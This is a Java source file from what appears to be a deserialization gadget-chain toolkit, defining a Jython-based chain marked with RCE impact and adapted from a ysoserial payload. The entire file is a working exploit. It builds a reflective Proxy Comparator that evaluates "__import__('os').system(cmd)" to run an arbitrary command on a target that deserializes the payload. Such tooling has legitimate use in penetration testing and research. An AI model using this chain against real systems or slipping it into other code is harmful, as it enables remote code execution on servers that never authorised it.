package org.ses.gadgetbuilder.chains1;

import org.python.core.*;
import org.ses.gadgetbuilder.annotations.Authors;
import org.ses.gadgetbuilder.annotations.Dependencies;
import org.ses.gadgetbuilder.annotations.Impact;
import org.ses.gadgetbuilder.chains.main.GadgetChain;
import org.ses.gadgetbuilder.chains.main.TrampolineConnector;
import org.ses.gadgetbuilder.chains.trampolines.doubleparam.CompareTrampoline;

import java.lang.reflect.Constructor;
import java.lang.reflect.Proxy;
import java.util.Comparator;
import java.util.HashMap;

/**
 * https://github.com/BishopFox/ysoserial-bf/blob/master/src/main/java/ysoserial/payloads/Jython3.java
 */
@Dependencies({ "org.python:jython-standalone:2.7.3" })
@Authors({ Authors.SSEELEY, Authors.RCALVI })
@Impact(Impact.RCE)
public class Jython4 extends GadgetChain<CompareTrampoline> {
    public Jython4(CompareTrampoline _trampoline) {
        super(_trampoline);
    }

    @Override
    protected TrampolineConnector createPayload(String command) throws Exception {

        Class<?> BuiltinFunctionsclazz = Class.forName("org.python.core.BuiltinFunctions");
        Constructor<?> c = BuiltinFunctionsclazz.getDeclaredConstructors()[0];
        c.setAccessible(true);
        Object builtin = c.newInstance("rce", 18, 1);
        PyMethod handler = new PyMethod((PyObject)builtin, null, new PyString().getType());
        Comparator comparator = (Comparator) Proxy.newProxyInstance(Comparator.class.getClassLoader(), new Class<?>[]{Comparator.class}, handler);

        HashMap<Object, PyObject> myargs = new HashMap<Object, PyObject>();
        myargs.put("cmd", new PyString(command));
        PyStringMap locals = new PyStringMap(myargs);

        return new TrampolineConnector(comparator, new PyString("__import__('os').system(cmd)"), locals);
    }

    @Override
    protected void postProcessPayload() throws Exception {

    }

    @Override
    protected String getStackTrace() {
        return "com.sun.proxy.$Proxy4.compare\n" +
                "org.python.core.PyMethod.invoke\n" +
                "org.python.core.PyMethod.__call__\n" +
                "org.python.core.PyMethod.instancemethod___call__\n" +
                "org.python.core.PyObject.__call__\n" +
                "org.python.core.PyBuiltinFunctionNarrow.__call__\n" +
                "org.python.core.BuiltinFunctions.__call__\n" +
                "org.python.core.__builtin__.eval\n" +
                "org.python.core.Py.runCode";
    }
}
